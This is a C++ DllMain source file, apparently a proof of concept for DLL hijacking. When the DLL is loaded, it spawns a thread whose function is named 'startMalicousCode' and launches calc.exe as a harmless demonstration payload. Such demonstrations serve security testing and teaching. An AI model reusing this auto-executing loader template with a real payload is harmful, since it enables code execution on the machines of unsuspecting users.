// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include "exports.h"
#include <iostream>

INT startMalicousCode(HMODULE hModule);

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CreateThread(nullptr, NULL, (LPTHREAD_START_ROUTINE)startMalicousCode, hModule, NULL, nullptr);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    default:
        break;
    }
    return TRUE;
}

INT startMalicousCode(HMODULE hModule)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    wchar_t prog[] = TEXT("calc.exe");
    const LPWSTR commandLine = prog;

    BOOL success = CreateProcess(
        nullptr,
        commandLine,
        nullptr,
        nullptr,
        FALSE,
        0,
        nullptr,
        nullptr,
        &si,
        &pi
    );

    if (!success)
    {
        DWORD error = GetLastError();
        std::cerr << "Failed to launch calculator. Error code: " << error << "\n";
        return false;
    }

    // Close process and thread handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return true;
}